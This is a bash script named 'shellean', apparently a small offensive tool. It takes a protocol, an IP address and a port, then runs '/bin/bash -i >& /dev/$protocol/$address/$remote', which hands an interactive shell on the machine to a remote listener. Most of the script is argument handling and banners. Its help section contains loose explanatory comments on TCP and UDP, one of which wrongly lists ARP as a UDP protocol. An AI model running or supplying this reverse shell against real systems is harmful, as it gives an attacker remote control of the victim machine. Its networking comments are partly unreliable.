# Copyright (C) 2023, Nathalon

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

tput bold;

license()
{
  echo '+-----------------------------------------------------------------------------------+';
  echo '| shellean, copyright (C) 2023-2024 Nathalon                                        |';
  echo '|                                                                                   |';
  echo '| This program comes with ABSOLUTELY NO WARRANTY; for details type show w.          |';
  echo '| This is free software, and you are welcome to redistribute it                     |';
  echo '| under certain conditions; type show c for details.                                |';
  echo '+-----------------------------------------------------------------------------------+';
}

help()
{
   echo '-> usage: /bin/bash shellean.sh [-p <Protocol> -a <Internet Protocol Address> -r <Remote Port>]';
   echo '-> options:';
   echo '';
   echo '-l -> Print the GPL license and exit.';
   echo '-h -> Print help and exit.';
   echo '-V -> Print the software version and exit.';
   echo '-p -> Specify the Protocol.'; 

   # The Transmission Control Protocol (TCP).

   # Potentially hinted by the name, this protocol is designed with reliability and guarantee in mind. 

   # This protocol reserves a constant connection between the two devices for the amount of time it 
   # takes for the data to be sent and received.

   # Not only this, but TCP incorporates error checking into its design. 

   # Error checking is how TCP can guarantee that data sent from the small chunks in the session layer (layer 5) 
   # has then been received and reassembled in the same order.

   # TCP is used for situations such as file sharing, internet browsing or sending an email.

   # This usage is because these services require the data to be accurate and complete (no good having half a file!).

   # Now let's move onto the User Datagram Protocol (or UDP for short). 

   # This protocol is not nearly as advanced as its brother - the TCP protocol. 

   # It doesn't boast the many features offered by TCP, such as error checking and reliability. 

   # In fact, any data that gets sent via UDP is sent to the computer whether it gets there or not. 

   # There is no synchronisation between the two devices or guarantee; just hope for the best, and fingers crossed.

   # UDP is useful in situations where there are small pieces of data being sent. 

   # For example, protocols used for discovering devices (ARP and DHCP) or larger files 
   # such as video streaming (where it is okay if some part of the video is pixelated.

   # Pixels are just lost pieces of data!

   echo '-a -> Specify the Internet Protocol Address to connect to.';
   echo '-r -> Specify the Remote Port to connect to.';
}

version()
{
  echo -e '\e[5m';
  echo '--------------------------------------------------------------------------';
  echo '-- Writen by Nathalon at (2023-2024), Version: (0.0.1)                  --';
  echo '-- Contact me on Telegram: https://t.me/braindisassemblue               --';
  echo '--------------------------------------------------------------------------';
}

while getopts 'lhVp:a:r:' options;
do
  case $options in
    l) license; exit;;
    h) help; exit;;
    V) version; exit;;
    p) protocol=$OPTARG;;
    a) address=$OPTARG;;
    r) remote=$OPTARG;;    
  esac
done

if [ -z $protocol ];
  then
    echo '[!] -> You need to Specify a Protocol';
    echo '';
    
    help;
    exit;

elif [ -z $address ];
  then
    echo '[!] -> You need to Specify a Internet Protocol Address';
    echo '';
    
    help;
    exit;

elif [ -z $remote ];
  then
    echo '[!] -> You need to Specify a Remote Port';
    echo '';
    
    help;
    exit;

else
  echo '--------------------------------------------------------------------------';
  echo '[i] Starting shellean at:' $(date);
  echo '--------------------------------------------------------------------------';

  echo '[i] Connecting to:' $address:$remote;

  /bin/bash -i >& /dev/$protocol/$address/$remote 0>&1;

  echo '--------------------------------------------------------------------------';
  echo '[i] Exiting shellean at:' $(date);
  echo '--------------------------------------------------------------------------';
fi
